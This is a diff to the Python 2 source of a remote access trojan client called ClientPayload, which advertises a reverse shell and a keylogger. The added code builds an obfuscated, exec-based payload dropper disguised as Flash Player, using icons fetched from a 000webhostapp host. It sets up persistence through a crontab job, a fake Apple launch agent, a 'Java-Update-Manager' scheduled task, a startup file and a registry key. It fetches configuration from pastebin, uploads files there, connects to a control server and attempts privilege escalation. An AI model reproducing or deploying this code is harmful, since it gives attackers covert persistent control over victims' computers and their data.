@@ -45,74 +45,8 @@
 
 
                             https://github.com/colental/ae
-"""
 
 
-
-def config(*arg, **options):
-    def decorator(function):
-        @functools.wraps(function)
-        def wrapper(*args, **kwargs):
-            return function(*args, **kwargs)
-        for k,v in options.items():
-            setattr(wrapper, k, v)
-        wrapper.platforms = ['win32','linux2','darwin'] if not 'platforms' in options else options['platforms']
-        return wrapper
-    return decorator
-
-
-for pkg in '''import os
-import sys
-import imp
-import mss
-import time
-import json
-import zlib
-import uuid
-import numpy
-import base64
-import ctypes
-import pickle
-import Queue
-import struct
-import socket
-import random
-import ftplib
-import urllib
-import urllib2
-import zipfile
-import functools
-import threading
-import cStringIO
-import subprocess
-from twilio.rest import Client
-from collections import OrderedDict
-from Crypto.PublicKey import RSA
-from Crypto.Hash import SHA256, HMAC
-from Crypto.Cipher import AES, PKCS1_OAEP
-from Crypto.Util.number import long_to_bytes, bytes_to_long
-from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey'''.splitlines():
-    exec pkg in globals()
-
-if os.name is 'nt':
-    for p in '''from wmi import WMI
-from pyHook import HookManager
-from pythoncom import PumpMessages, CoInitialize
-from win32com.client import Dispatch
-from win32com.shell.shell import ShellExecuteEx
-from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE'''.splitlines():
-        exec p in globals()
-
-else:
-    try:
-        exec "from pyxhook import HookManager" in globals()
-    except: pass
-
-
-
-class ClientPayload(object):
-
-    '''
     >  30 modules - interactive or automated
         - reverse tcp:   remotely access host machine with a shell inspired by Meterpreter in the Metasploit Framework
         - keylogger:     log user keystrokes with the window they were entered in
@@ -138,14 +72,86 @@ class ClientPayload(object):
         - Base64 encode data for transport to prevent loss of binary, non-printables, or differing codecs
         - 256 bit keys generated each session via Diffie-Hellman transactionless key-agreement method
 
-    '''
+"""
+
+for pkg in '''import os
+import sys
+import imp
+import mss
+import time
+import json
+import zlib
+import uuid
+import numpy
+import base64
+import ctypes
+import pickle
+import Queue
+import struct
+import socket
+import random
+import ftplib
+import urllib
+import urllib2
+import marshal
+import zipfile
+import functools
+import threading
+import cStringIO
+import subprocess
+from twilio.rest import Client
+from collections import OrderedDict
+from Crypto.PublicKey import RSA
+from Crypto.Hash import SHA256, HMAC
+from Crypto.Cipher import AES, PKCS1_OAEP
+from Crypto.Util.number import long_to_bytes, bytes_to_long
+from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey'''.splitlines():
+    try:
+        exec pkg in globals()
+    except ImportError:
+        ClientPayload.debug("Import error: {}".format(pkg))
+    
+if os.name is 'nt':
+    for p in '''from wmi import WMI
+from pyHook import HookManager
+from pythoncom import PumpMessages, CoInitialize
+from win32com.client import Dispatch
+from win32com.shell.shell import ShellExecuteEx
+from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE'''.splitlines():
+        try:
+            exec p in globals()
+        except ImportError:
+            ClientPayload.debug("Import error: {}".format(p))
+
+else:
+    try:
+        exec "from pyxhook import HookManager" in globals()
+    except: pass
+
+
+
+def config(*arg, **options):
+    def decorator(function):
+        @functools.wraps(function)
+        def wrapper(*args, **kwargs):
+            return function(*args, **kwargs)
+        for k,v in options.items():
+            setattr(wrapper, k, v)
+        wrapper.platforms = ['win32','linux2','darwin'] if not 'platforms' in options else options['platforms']
+        return wrapper
+    return decorator
+
+
+
+
+class ClientPayload(object):
+
     __name__ = 'ClientPayload'
     _abort   = 0
-    _debug   = 0
+    _debug   = 1
     _config  = OrderedDict()
     _tasks   = Queue.Queue()
     _lock    = threading.Lock()
-
 
     def __init__(self, *args, **kwargs):
         self._workers = OrderedDict()
@@ -427,47 +433,6 @@ class ClientPayload(object):
             return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))
         except Exception as e:
             ClientPayload.debug("{} error: {}".format(ClientPayload._get_xor.func_name, str(e)))
-
-
-    @staticmethod
-    def _get_primes(n):
-        try:
-            sieve = numpy.ones(n/3 + (n%6==2), dtype=numpy.bool)
-            for i in xrange(1,int(n**0.5)/3+1):
-                if sieve[i]:
-                    k=3*i+1|1
-                    sieve[       k*k/3     ::2*k] = False
-                    sieve[k*(k-2*(i&1)+4)/3::2*k] = False
-            return numpy.r_[2,3,((3*numpy.nonzero(sieve)[0][1:]+1)|1)]
-        except Exception as e:
-            ClientPayload.debug("{} error: {}".format(ClientPayload._get_primes.func_name, str(e)))
-
-
-    @staticmethod
-    def _get_nth_prime(p):
-        try:
-            return (ClientPayload._get_primes(i)[-1] for i in xrange(int(p*1.5), int(p*15)) if len(ClientPayload._get_primes(i)) == p).next()     
-        except Exception as e:
-            ClientPayload.debug("{} error: {}".format(ClientPayload._get_nth_prime.func_name, str(e)))
-
-
-    @staticmethod
-    def _get_obfuscated(data):
-        try:
-            a = bytearray(reversed(bytes(data)))
-            b = ClientPayload._get_nth_prime(len(a) + 1)
-            c = ClientPayload._get_primes(b)
-            return base64.b64encode("".join([(chr(a.pop()) if n in c else os.urandom(1)) for n in xrange(b)]))
-        except Exception as e:
-            ClientPayload.debug("{} error: {}".format(ClientPayload._get_obfuscated.func_name, str(e)))
-
-
-    @staticmethod
-    def _get_deobfuscated(block):
-        try:
-            return bytes().join(chr(bytearray(base64.b64decode(bytes(block)))[_]) for _ in ClientPayload._get_primes(len(bytearray(base64.b64decode(bytes(block))))))
-        except Exception as e:
-            ClientPayload.debug("{} error: {}".format(ClientPayload._get_deobfuscated.func_name, str(e)))
 
 
     @staticmethod
@@ -984,35 +949,51 @@ class ClientPayload(object):
 
 
     @config(platforms=['win32','linux2','darwin'])
-    def _persistence_add_encrypted_stager(self, name='AdobeFlashPlayer'):
+    def _persistence_check(self, *args, **kwargs):
         try:
-            if ClientPayload._config['resources'].get('stager'):
-                output      = []
-                b64var      = self._get_random_var(6)
-                aesvar      = self._get_random_var(6)
-                key         = self._get_random_var(32)
-                iv          = self._get_random_var(16)
-                data        = ClientPayload._config['resources']['stager'].get('code')
-                config      = ClientPayload._config['resources']['stager'].get('config')
-                output_file = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', "{}.py".format(name))
-                main        = "\n\nif __name__ == '__main__':\n\tif '--debug' in sys.argv:\n\t\t_debug = True\n\telse:\n\t\t_debug = False\n\tmain(config={})".format(int(config.get('r')))
-                imports     = ["from __future__ import print_function", "from base64 import b64decode as %s" % b64var, "from Crypto.Cipher import AES as %s" % aesvar]
-                _           = [(imports.append(line.strip()) if "import" in line and "__future__" not in line else output.append(line)) for line in data.splitlines()]
-                cipher      = AES.new(key, AES.MODE_CBC, iv)
-                ciphertext  = base64.b64encode(iv + cipher.encrypt(self._get_padded('\n'.join(output), AES.block_size, '{')))
-                with file(output_file, 'w') as fp:
-                    fp.write(";".join(imports) + "\nexec(%s(\"%s\"))" % (b64var,base64.b64encode("exec(%s.new(\"%s\", 2).decrypt(%s(\"%s\")).rstrip(\"{\"))" % (aesvar, key, b64var, ciphertext))))
-                return (True, output_file)
-            else:
-                 return (False, "Error: missing resources required for encrypted stager")
+            if not self.persistence.methods['payload_dropper']['established']:
+                try:
+                    self.persistence.methods['payload_dropper']['established'], self.persistence.methods['payload_dropper']['result'] = self._persistence_add_payload_dropper()
+                except Exception as e0:
+                    self.debug("{} error: {}".format(self.persistence.func_name, str(e0)))
+                    self.persistence.methods['payload_dropper']['established'], self.persistence.methods['payload_dropper']['result'] = (False, None)
+            elif not os.path.isfile(self.persistence.methods['payload_dropper']['result']):
+                self.persistence.methods['payload_dropper']['established'] = False
+                self.persistence.methods['payload_dropper']['result'] = None
         except Exception as e:
-            return (False, '{} error: {}'.format(self._persistence_add_encrypted_stager.func_name, str(e)))
+            return (False, '{} error: {}'.format(self._persistence_check.func_name, str(e)))
+
+
+    @config(platforms=['win32','linux2','darwin'])
+    def _persistence_add_payload_dropper(self, name='flash', exe=True):
+        try:
+            if self._config['resources'].get('dropper'):
+                temp = os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp'
+                code = self._config['resources'].get('dropper').get('code')
+                data = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(code, '', 'exec')), 9))))
+                path = os.path.join(temp, '%s.py' % name)
+                with file(path, 'w') as fp:
+                    fp.write(data)
+                if exe:
+                    key  = self._get_random_var(16)
+                    work = os.path.join(temp, 'build')
+                    icon = self.wget(self._config['resources']['dropper']['icons']['flash']['ico' if os.name is 'nt' else ('icns' if 'darwin' in sys.platform else 'png')])
+                    done = subprocess.call('%s -m PyInstaller --clean --onefile --workdir %s --distdir %s -w --icon %s --key %s %s' % (sys.executable, work, temp, icon, key, path)) == 0
+                    if done:
+                        os.rmdir(work)
+                        os.remove(path)
+                        path = os.path.splitext(path)[0] + '.exe' if os.name is 'nt' else os.path.splitext(path)[0]                        
+                return (True, path)
+            else:
+                 return (False, "Error: missing resources required for encrypted dropper")
+        except Exception as e:
+            return (False, '{} error: {}'.format(self._persistence_add_payload_dropper.func_name, str(e)))
         
 
     @config(platforms=['win32','linux2','darwin'])
-    def _persistence_remove_encrypted_stager(self, *args, **kwargs):
+    def _persistence_remove_payload_dropper(self, *args, **kwargs):
         try:
-            target = self.persistence.methods['encrypted_stager']['result']
+            target = self.persistence.methods['payload_dropper']['result']
             if isinstance(target, bytes) and os.path.isfile(target):
                 if os.name is 'nt':
                     unhide = os.popen('attrib -h %s' % target).read()
@@ -1021,14 +1002,14 @@ class ClientPayload(object):
             else:
                 self.debug("File '{}' not found".format(target))
         except Exception as e:
-            self.debug('{} error: {}'.format(self._persistence_remove_encrypted_stager.func_name, str(e)))
+            self.debug('{} error: {}'.format(self._persistence_remove_payload_dropper.func_name, str(e)))
         return False
 
 
     @config(platforms=['win32','linux2','darwin'])
     def _persistence_add_hidden_file(self, *args, **kwargs):
-        if ClientPayload._config['resources'].get('stager'):
-            value = long_to_bytes(long(ClientPayload._config['resources'].get('stager')))
+        if self.persistence.methods['payload_dropper'].get('established'):
+            value = self.persistence.methods['payload_dropper'].get('result')
             if value and os.path.isfile(value):
                 try:
                     if os.name is 'nt':
@@ -1040,7 +1021,7 @@ class ClientPayload(object):
                         hide = subprocess.call('mv {} {}'.format(value, path), shell=True) == 0
                     if hide:
                         if path != value:
-                            ClientPayload._config['stager'] = bytes(bytes_to_long(self._upload_pastebin(path)[-21:]))
+                            ClientPayload._config['dropper'] = bytes(bytes_to_long(self._upload_pastebin(path)[-21:]))
                         return (True, path)
                 except Exception as e:        
                     return (False, 'Adding hidden file error: {}'.format(str(e)))
@@ -1050,22 +1031,19 @@ class ClientPayload(object):
 
     @config(platforms=['win32','linux2','darwin'])
     def _persistence_remove_hidden_file(self, *args, **kwargs):
-        if ClientPayload._config['resources'].get('stager'):
-            value = long_to_bytes(long(ClientPayload._config['resources'].get('stager')))
-            if value and os.path.isfile(value):
-                try:
-                    unhide  = 'attrib -h {}'.format(filename) if os.name is 'nt' else 'mv {} {}'.format(filename, os.path.join(os.path.dirname(filename), os.path.basename(filename).strip('.')))
-                    if subprocess.call(unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
-                        return True
-                except Exception as e:
-                    self.debug('{} error: {}'.format(self._persistence_remove_hidden_file.func_name, str(e)))
+        try:
+            unhide  = 'attrib -h {}'.format(filename) if os.name is 'nt' else 'mv {} {}'.format(filename, os.path.join(os.path.dirname(filename), os.path.basename(filename).strip('.')))
+            if subprocess.call(unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
+                return True
+        except Exception as e:
+            self.debug('{} error: {}'.format(self._persistence_remove_hidden_file.func_name, str(e)))
         return False 
 
 
     @config(platforms=['linux2'])
     def _persistence_add_crontab_job(self, minutes=10, name='flashplayer'):
-        if ClientPayload._config['resources'].get('stager'):
-            value = long_to_bytes(long(ClientPayload._config['resources'].get('stager')))
+        if self.persistence.methods['payload_dropper'].get('established'):
+            value = self.persistence.methods['payload_dropper'].get('result')
             if value and os.path.isfile(value):
                 try:
                     if not os.path.isdir('/var/tmp'):
@@ -1100,27 +1078,24 @@ class ClientPayload(object):
 
     @config(platforms=['linux2'])
     def _persistence_remove_crontab_job(self, name='flashplayer'):
-        if ClientPayload._config['resources'].get('stager'):
-            value = long_to_bytes(long(ClientPayload._config['resources'].get('stager')))
-            if value and os.path.isfile(value):
-                try:
-                    with open('/etc/crontab','r') as fp:
-                        lines = [i.rstrip() for i in fp.readlines()]
-                        for line in lines:
-                            if name in line:
-                                _ = lines.pop(line, None)
-                    with open('/etc/crontab', 'a+') as fp:
-                        fp.write('\n'.join(lines))
-                    return True
-                except Exception as e:
-                    self.debug(str(e))
+        try:
+            with open('/etc/crontab','r') as fp:
+                lines = [i.rstrip() for i in fp.readlines()]
+                for line in lines:
+                    if name in line:
+                        _ = lines.pop(line, None)
+            with open('/etc/crontab', 'a+') as fp:
+                fp.write('\n'.join(lines))
+            return True
+        except Exception as e:
+            self.debug(str(e))
         return False
 
 
     @config(platforms=['darwin'])
     def _persistence_add_launch_agent(self,  name='com.apple.update.manager'):
-        if ClientPayload._config['resources'].get('stager') and ClientPayload._config['resources'].get('launch agent'):
-            value = long_to_bytes(long(ClientPayload._config['resources'].get('stager')))
+        if self.persistence.methods['payload_dropper'].get('established'):
+            value = self.persistence.methods['payload_dropper'].get('result')
             if value and os.path.isfile(value):
                 try:
                     code    = ClientPayload._config['resources'].get('bash')
@@ -1144,21 +1119,21 @@ class ClientPayload(object):
 
     @config(platforms=['darwin'])
     def _persistence_remove_launch_agent(self, name='com.apple.update.manager'):
-        if ClientPayload._config['resources'].get('stager'):
-            if self.persistence.methods['launch_agent'].get('established'):
-                launch_agent = self.persistence['launch_agent'].get('result')
-                if os.path.isfile(launch_agent):
-                    try:
-                        os.remove(launch_agent)
-                        return True
-                    except: pass
-        return False
+        if self.persistence.methods['launch_agent'].get('established'):
+            launch_agent = self.persistence['launch_agent'].get('result')
+            if os.path.isfile(launch_agent):
+                try:
+                    os.remove(launch_agent)
+                    return True
+                except:
+                    return False
+        return True
 
 
     @config(platforms=['win32'])
     def _persistence_add_scheduled_task(self, name='Java-Update-Manager'):
-        if ClientPayload._config['resources'].get('stager'):
-            value = long_to_bytes(long(ClientPayload._config['resources'].get('stager')))
+        if self.persistence.methods['payload_dropper'].get('established'):
+            value = self.persistence.methods['payload_dropper'].get('result')
             if value and os.path.isfile(value):
                 tmpdir      = os.path.expandvars('%TEMP%')
                 task_run    = os.path.join(tmpdir, name + os.path.splitext(value)[1])
@@ -1176,18 +1151,20 @@ class ClientPayload(object):
 
 
     @config(platforms=['win32'])
-    def _persistence_remove_scheduled_task(self, name='Java-Update-Manager'):
-        if ClientPayload._config['resources'].get('stager'):
+    def _persistence_remove_scheduled_task(self, *args, **kwargs):
+        if self.persistence.methods['scheduled_task'].get('established'):
+            value = self.persistence.methods['scheduled_task'].get('result')
             try:
-                return subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(name), shell=True) == 0
+                return subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(value), shell=True) == 0
             except:
                 return False
+        return True
 
 
     @config(platforms=['win32'])
     def _persistence_add_startup_file(self, name='Java-Update-Manager'):
-        if ClientPayload._config['resources'].get('stager'):
-            value = long_to_bytes(long(ClientPayload._config['resources'].get('stager')))
+        if self.persistence.methods['payload_dropper'].get('established'):
+            value = self.persistence.methods['payload_dropper'].get('result')
             if value and os.path.isfile(value):
                 try:
                     appdata = os.path.expandvars("%AppData%")
@@ -1206,29 +1183,32 @@ class ClientPayload(object):
 
 
     @config(platforms=['win32'])
-    def _persistence_remove_startup_file(self, name='Java-Update-Manager'):
-        if ClientPayload._config['resources'].get('stager'):
-            if os.name != 'nt':
-                return (False, None)
-            appdata      = os.path.expandvars("%AppData%")
-            startup_dir  = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
-            startup_file = os.path.join(startup_dir, name) + '.eu.url'
-            if os.path.exists(startup_file):
-                try:
-                    os.remove(startup_file)
-                    return True
-                except:
+    def _persistence_remove_startup_file(self, *args, **kwargs):
+        if self.persistence.methods['startup_file'].get('established'):
+            value = self.persistence.methods['startup_file'].get('result')
+            if value and os.path.isfile(value):
+                if os.name != 'nt':
+                    return (False, None)
+                appdata      = os.path.expandvars("%AppData%")
+                startup_dir  = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
+                startup_file = os.path.join(startup_dir, value) + '.eu.url'
+                if os.path.exists(startup_file):
                     try:
-                        _  = os.popen('del {} /f'.format(startup_file)).read()
+                        os.remove(startup_file)
                         return True
-                    except: pass
-            return False
+                    except:
+                        try:
+                            _  = os.popen('del {} /f'.format(startup_file)).read()
+                            return True
+                        except:
+                            return False
+        return True
 
 
     @config(platforms=['win32'])
     def _persistence_add_registry_key(self, name='Java-Update-Manager'):
-        if ClientPayload._config['resources'].get('stager'):
-            value = long_to_bytes(long(ClientPayload._config['resources'].get('stager')))
+        if self.persistence.methods['payload_dropper'].get('established'):
+            value = self.persistence.methods['payload_dropper'].get('result')
             if value and os.path.isfile(value):
                 try:
                     self._get_registry_key(name, value)
@@ -1240,7 +1220,8 @@ class ClientPayload(object):
 
     @config(platforms=['win32'])
     def _persistence_remove_registry_key(self, name='Java-Update-Manager'):
-        if ClientPayload._config['resources'].get('stager'):
+        if self.persistence.methods['registry_key'].get('established'):
+            value = self.persistence.methods['registry_key'].get('result')
             try:
                 key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
                 DeleteValue(key, name)
@@ -1505,33 +1486,34 @@ class ClientPayload(object):
         while '\n' not in data:
             try:
                 data += self._session['socket'].recv(65536)
-            except socket.timeout:
+            except (socket.timeout, socket.error):
                 break
         if data and len(bytes(data)):
             try:
                 text = self._decrypt_data(bytes(data).rstrip())
                 task = json.loads(text)
                 return task
-            except Exception as e:
-                self.debug('{} error: {}'.format(self._server_recv.func_name, str(e)))
-    
+            except Exception as e2:
+                self.debug('{} error: {}'.format(self._server_recv.func_name, str(e2)))
+                
  
     def _server_connect(self, port=1337):
         try:
             host = self._get_server_addr()
+            self._session['socket'] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self._session['socket'].connect((host, port))
-            self._session['connection'].set()
-            return
+            self._session['connection'].set() 
+            return self._session['socket']
         except Exception as e:
             self.debug("{} error: {}".format(self._server_connect.func_name, str(e)))
-            self._session['connection'].clear() if bool('connection' in self._session and isinstance(self._session['connection'], threading.Event)) else None
-            print(str(e))            
         self.kill()
         time.sleep(5)
         return self.run()
 
 
     def _server_prompt(self, *args, **kwargs):
+        self._session['prompt'] = threading.Event()
+        self._session['prompt'].set()
         while True:
             try:
                 self._session['prompt'].wait()
@@ -1583,8 +1565,7 @@ class ClientPayload(object):
                 self._session['socket'].send(long_to_bytes(xA))
                 xB = bytes_to_long(self._session['socket'].recv(256))
                 x  = pow(xB, a, p)
-                y  = SHA256.new(long_to_bytes(x)).hexdigest()
-                return self._get_obfuscated(y)
+                return SHA256.new(long_to_bytes(x)).hexdigest()
             else:
                 self.debug("{} timed out".format(self._session_key.func_name))
         except Exception as e:
@@ -1644,7 +1625,7 @@ class ClientPayload(object):
     def _decrypt_data(self, data, key=None):
         try:
             if not key:
-                key = self._get_deobfuscated(self._session['key'])
+                key = self._session['key']
             return getattr(self, '_decrypt_{}'.format(self._sysinfo['encryption']))(data, key)
         except Exception as e:
             self.debug('{} error: {}'.format(self._decrypt_data.func_name, str(e)))
@@ -1668,7 +1649,7 @@ class ClientPayload(object):
     def _encrypt_data(self, data, key=None):
         try:
             if not key:
-                key = self._get_deobfuscated(self._session['key'])
+                key = self._session['key']
             return getattr(self, '_encrypt_{}'.format(self._sysinfo['encryption']))(data, key)
         except Exception as e:
             self.debug('{} error: {}'.format(self._encrypt_data.func_name, str(e)))
@@ -1691,8 +1672,11 @@ class ClientPayload(object):
 
     def _get_startup(self, **kwargs):
         try:
-            self._session['socket'] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            ClientPayload._config['resources']['ports'] = json.loads(urllib.urlopen('https://pastebin.com/raw/BCjkh5Gh').read())
+            resources = {'ports': json.loads(urllib.urlopen('https://pastebin.com/raw/BCjkh5Gh').read()), 'icons': {'flash': {'ico':'http://elderlyeggplant.000webhostapp.com/icon.ico', 'png':'http://elderlyeggplant.000webhostapp.com/icon.png', 'icns': 'http://elderlyeggplant.000webhostapp.com/icon.icns'}}}
+            if ClientPayload._config.get('resources'):
+                ClientPayload._config['resources'].update(resources)
+            else:
+                ClientPayload._config['resources'] = resources
         except Exception as e1:
             ClientPayload.debug("{} error: {}".format(self._get_startup.func_name, str(e1)))
   
@@ -2243,9 +2227,9 @@ class ClientPayload(object):
         try:
             if self._get_administrator():
                 return "Current user '{}' has administrator privileges".format(self._sysinfo.get('username'))
-            if ClientPayload._config['resources'].get('stager') and os.path.isfile(long_to_bytes(long(ClientPayload._config['resources'].get('stager')))):
+            if ClientPayload._config['resources'].get('dropper') and os.path.isfile(long_to_bytes(long(ClientPayload._config['resources'].get('dropper')))):
                 if os.name is 'nt':
-                    ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(long_to_bytes(long(ClientPayload._config['resources'].get('stager')))))
+                    ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(long_to_bytes(long(ClientPayload._config['resources'].get('dropper')))))
                 else:
                     return "Privilege escalation not yet available on '{}'".format(sys.platform)
         except Exception as e:
@@ -2335,19 +2319,26 @@ class ClientPayload(object):
             self.debug("{} error: '{}'".format(self.screenshot.func_name, str(e)))
 
 
-    @config(platforms=['win32','linux2','darwin'], methods={method: {'established': bool(), 'result': bytes()} for method in ['encrypted_stager','hidden_file','scheduled_task','registry_key','startup_file','launch_agent','crontab_job']}, command=True, usage='persistence <args>')
+    @config(platforms=['win32','linux2','darwin'], methods={method: {'established': bool(), 'result': bytes()} for method in ['payload_dropper','hidden_file','scheduled_task','registry_key','startup_file','launch_agent','crontab_job']}, command=True, usage='persistence <args>')
     def persistence(self, args=None):
         """
         establish persistence to survive reboots
         """
         try:
             if not args:
-                for method in [_ for _ in self.persistence.methods if not self.persistence.methods[_]['established']]:
+                if not self.persistence.methods['payload_dropper']['established']:
+                    try:
+                        self.persistence.methods['payload_dropper']['established'], self.persistence.methods['payload_dropper']['result'] = self._persistence_add_payload_dropper()
+                    except Exception as e0:
+                        self.debug("{} error: {}".format(self.persistence.func_name, str(e0)))
+                        self.persistence.methods['payload_dropper']['established'], self.persistence.methods['payload_dropper']['result'] = (False, None)
+                elif not os.path.isfile(self.persistence.methods['payload_dropper']['result']):
+                        self.persistence.methods['payload_dropper']['established'] = False
+                        self.persistence.methods['payload_dropper']['result'] = None
+                for method in [_ for _ in self.persistence.methods if 'payload_dropper' != method if not self.persistence.methods[_]['established']]:
                     target = '_persistence_add_{}'.format(method)
                     if sys.platform in getattr(self, target).platforms:
-                        established, result = getattr(self, target)()
-                        self.persistence.methods[method]['established'] = established
-                        self.persistence.methods[method]['result'] = result
+                        self.persistence.methods[method]['established'], self.persistence.methods[method]['result'] = getattr(self, target)()
                 return json.dumps({k: v for k,v in self.persistence.methods if sys.platform in getattr(self, k).platforms}, indent=2)
             else:
                 cmd, _, method = str(args).partition(' ')
@@ -2357,12 +2348,11 @@ class ClientPayload(object):
                     return self.persistence.usage
                 elif self.persistence.methods[method].get('established'):
                     return json.dumps(self.persistence.methods[method])
-                else: 
-                    target = '_persistence_{}_{}'.format(cmd, method)
+                else:
+                    self._persistence_check()
+                    target = '_persistence_{}_{}'.format(method)
                     if sys.platform in getattr(self, target).platforms:
-                        established, result = getattr(self, target)()
-                        self.persistence.methods[method]['established'] = established
-                        self.persistence.methods[method]['result'] = result
+                        self.persistence.methods[method]['established'], self.persistence.methods[method]['result'] = getattr(self, target)()
                     return json.dumps(self.persistence.methods[method])
         except Exception as e:
             self.debug("{} error: '{}'".format(self.persistence.func_name, str(e)))
@@ -2470,14 +2460,12 @@ class ClientPayload(object):
         """
         connect to server and start new session
         """
-        self._session['prompt']         = threading.Event()
-        self._session['connection']     = threading.Event()
         try:
-            self._server_connect()
+            self._session['connection'] = threading.Event()
+            self._session['socket']     = self._server_connect()
             self._session['key']        = self._session_key()
             self._session['id']         = self._session_id()
             self._session['public_key'] = self._get_public_key()
-            self._session['prompt'].set()
         except Exception as e:
             self.debug("{} error: '{}'".format(self.connect.func_name, str(e)))
 
@@ -2549,12 +2537,12 @@ def main(*args, **kwargs):
     if 'l' in kwargs:
         l = kwargs.get('l')
         code = ClientPayload._get_remote_resource(l)
-        ClientPayload._config['resources']['stager'] = {'code': code}
+        ClientPayload._config['resources']['dropper'] = {'code': code}
         if 'r' in kwargs:
             r = kwargs.get('r')
             config = ClientPayload._get_remote_resource(r)
             config = json.loads(config)
-            ClientPayload._config['resources']['stager'].update({'config': config})
+            ClientPayload._config['resources']['dropper'].update({'config': config})
     if 'g' in kwargs:
         g = kwargs.get('g')
         bash = ClientPayload._get_remote_resource(g)
@@ -2587,5 +2575,3 @@ if __name__ == '__main__':
   "w": "77888090548015223857",
   "z": "79892739118577505130"
 })
-
-
